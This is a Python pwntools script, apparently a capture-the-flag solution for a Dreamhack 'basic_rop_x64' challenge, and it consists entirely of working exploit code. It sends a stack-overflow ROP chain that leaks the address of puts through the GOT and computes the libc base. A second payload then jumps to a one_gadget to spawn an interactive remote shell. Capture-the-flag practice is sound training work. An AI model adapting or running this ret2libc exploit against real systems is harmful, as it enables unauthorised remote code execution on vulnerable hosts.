from pwn import *
context.log_level='debug'

n = remote('host1.dreamhack.games',8392)
elf = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

pop_ret = 0x400883

payload1 = b'A'*0x48
payload1 += p64(pop_ret)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['main'])

n.send(payload1)

n.recvuntil(b'\x90')
leak = u64(b'\x90'+n.recvuntil(b'\x7f')+b'\x00\x00')
log.info('leak : '+hex(leak))

libc_base = leak - libc.symbols['puts']
gadget = libc_base + 0x45216

payload2 = b'A'*0x48
payload2 += p64(gadget)

n.send(payload2)

n.interactive()
